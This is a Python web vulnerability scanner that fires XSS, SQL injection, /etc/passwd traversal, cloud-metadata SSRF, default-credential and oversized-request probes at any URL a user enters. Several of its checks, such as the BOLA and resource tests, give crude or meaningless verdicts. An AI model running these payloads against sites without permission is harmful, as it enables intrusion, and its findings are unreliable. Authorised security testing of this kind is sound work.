import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
from tabulate import tabulate
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from art import text2art
import os 
os.system ("clear")
# تهيئة colorama
init(autoreset=True)

# رسم العنوان
print(text2art("Scan Injection", font='block'))

# طباعة رسالة الترحيب
welcome_message = "Welcome to the Scan Injection Tool!"
instagram_message = "Don't forget to follow my Instagram account"
print(Fore.CYAN + welcome_message)
print(Fore.MAGENTA + instagram_message)

# طلب رابط الموقع من المستخدم
url = input("Please enter the website URL to be checked (e.g., http://example.com): ")

# دالة لإضافة النتائج إلى الجدول
results = []

def add_result(test_name, status, details, severity):
    color = {
        "Info": Fore.YELLOW,
        "Low": Fore.GREEN,
        "Medium": Fore.LIGHTYELLOW_EX,
        "High": Fore.RED
    }
    result = [test_name, f"{color[severity]}{status}", details]
    results.append(result)
    # طباعة النتيجة مباشرة بعد الفحص
    print(tabulate([result], headers=["Test", "Status", "Details"], tablefmt="grid"))

# فحص XSS عميق
def check_xss(url):
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>"
    ]
    vulnerable = False
    for payload in xss_payloads:
        response = requests.get(url, params={'q': payload})
        if payload in response.text:
            add_result("XSS", "Vulnerable", f"Payload: {payload}", "High")
            vulnerable = True
    if not vulnerable:
        add_result("XSS", "Not Vulnerable", "No payloads were executed", "Low")

# فحص SQL Injection عميق
def check_sql_injection(url):
    sql_payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR '1'='1' #"
    ]
    vulnerable = False
    for payload in sql_payloads:
        response = requests.get(url, params={'id': payload})
        if any(error in response.text for error in ["SQL syntax", "mysql", "syntax error", "unclosed quotation mark"]):
            add_result("SQL Injection", "Vulnerable", f"Payload: {payload}", "High")
            vulnerable = True
    if not vulnerable:
        add_result("SQL Injection", "Not Vulnerable", "No payloads were executed", "Low")

# فحص Header Injection
def check_header_injection(url):
    injection_payload = '"><script>alert("Header Injection")</script>'
    headers = {'User-Agent': injection_payload}
    response = requests.get(url, headers=headers)
    if injection_payload in response.text:
        add_result("Header Injection", "Vulnerable", "Payload in User-Agent header", "High")
    else:
        add_result("Header Injection", "Not Vulnerable", "No injection in headers", "Low")

# فحص Directory Traversal
def check_directory_traversal(url):
    traversal_payloads = [
        "../../etc/passwd",
        "../../../../etc/passwd"
    ]
    vulnerable = False
    for payload in traversal_payloads:
        response = requests.get(f"{url}/{payload}")
        if "root:" in response.text:
            add_result("Directory Traversal", "Vulnerable", f"Payload: {payload}", "High")
            vulnerable = True
    if not vulnerable:
        add_result("Directory Traversal", "Not Vulnerable", "No directory traversal detected", "Low")

# فحص SSRF
def check_ssrf(url):
    ssrf_payload = 'http://169.254.169.254/latest/meta-data/'
    try:
        response = requests.get(url, params={'url': ssrf_payload})
        if "instance-id" in response.text:
            add_result("SSRF", "Vulnerable", f"Payload: {ssrf_payload}", "High")
        else:
            add_result("SSRF", "Not Vulnerable", "No SSRF vulnerability detected", "Low")
    except requests.exceptions.RequestException:
        add_result("SSRF", "Error", "Request failed", "High")

# فحص BOLA
def check_bola(url):
    test_object_id = "12345"
    unauthorized_user_id = "67890"
    response = requests.get(f"{url}/objects/{test_object_id}")
    if unauthorized_user_id in response.text:
        add_result("BOLA", "Vulnerable", f"Object accessed with ID: {unauthorized_user_id}", "High")
    else:
        add_result("BOLA", "Not Vulnerable", "No unauthorized access detected", "Low")

# فحص Broken Authentication
def check_broken_authentication(url):
    login_payload = {'username': 'admin', 'password': 'password'}
    response = requests.post(f"{url}/login", data=login_payload)
    if response.status_code == 200 and "Welcome" in response.text:
        add_result("Broken Authentication", "Vulnerable", "Default credentials work", "High")
    else:
        add_result("Broken Authentication", "Not Vulnerable", "No broken authentication detected", "Low")

# فحص Unrestricted Resource Consumption
def check_unrestricted_resource_consumption(url):
    large_payload = 'A' * 1000000  # 1MB of data
    try:
        response = requests.post(url, data={'input': large_payload})
        if response.status_code == 200:
            add_result("Unrestricted Resource Consumption", "Vulnerable", "Server accepts large payloads", "High")
        else:
            add_result("Unrestricted Resource Consumption", "Not Vulnerable", "No unrestricted resource consumption detected", "Low")
    except requests.exceptions.RequestException:
        add_result("Unrestricted Resource Consumption", "Error", "Request failed", "High")

# فحص معلومات الخادم وعنوان IP
def check_server_info(url):
    response = requests.get(url)
    server = response.headers.get('Server')
    if server:
        add_result("Server Info", "Info", f"The server is running {server}", "Info")
    else:
        add_result("Server Info", "Info", "No server information found in headers", "Info")
    try:
        domain = url.split('//')[1].split('/')[0]
        ip_address = socket.gethostbyname(domain)
        add_result("IP Info", "Info", f"The IP address of {domain} is {ip_address}", "Info")
    except socket.gaierror:
        add_result("IP Info", "Error", "Could not resolve IP address", "High")

# فحص محتوى الموقع
def check_sensitive_info(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    sensitive_keywords = ["password", "username", "admin", "secret"]
    found = False
    for keyword in sensitive_keywords:
        if keyword in soup.text:
            add_result("Sensitive Info", "Vulnerable", f"Found keyword '{keyword}'", "Medium")
            found = True
    if not found:
        add_result("Sensitive Info", "Not Found", "No sensitive information found", "Low")

# فحص مكونات صفحة الويب
def check_web_components(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    scripts = soup.find_all('script')
    if scripts:
        add_result("Web Components", "Info", f"Found {len(scripts)} script tags", "Info")
    else:
        add_result("Web Components", "Info", "No script tags found", "Info")

# تشغيل الفحوصات بتوازي
def run_security_checks(url):
    with ThreadPoolExecutor(max_workers=10) as executor:
        checks = [
            executor.submit(check_xss, url),
            executor.submit(check_sql_injection, url),
            executor.submit(check_header_injection, url),
            executor.submit(check_directory_traversal, url),
            executor.submit(check_ssrf, url),
            executor.submit(check_bola, url),
            executor.submit(check_broken_authentication, url),
            executor.submit(check_unrestricted_resource_consumption, url),
            executor.submit(check_server_info, url),
            executor.submit(check_sensitive_info, url),
            executor.submit(check_web_components, url)
        ]
        for future in as_completed(checks):
            future.result()

print(f"Running security checks on {url}")
run_security_checks(url)
print("Security checks completed.")

# عرض النتائج في جدول
print(tabulate(results, headers=["Test", "Status", "Details"], tablefmt="grid"))
